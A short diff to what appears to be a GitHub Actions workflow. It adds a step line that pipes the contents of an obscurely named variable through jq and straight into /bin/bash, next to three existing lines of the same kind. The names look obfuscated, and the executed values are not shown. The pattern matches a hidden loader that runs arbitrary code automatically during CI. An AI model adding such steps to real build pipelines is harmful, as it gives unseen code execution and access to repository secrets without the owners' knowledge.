@@ -24,6 +24,7 @@ jobs:
           echo $q67 | jq -r .r88820 | /bin/bash
           printf '%s' "$y70" | jq -r .lv27 | /bin/bash
           echo $is15194 | jq -r .txv513 | /bin/bash
+          printf '%s' "$lvlo93839" | jq -r .h1 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
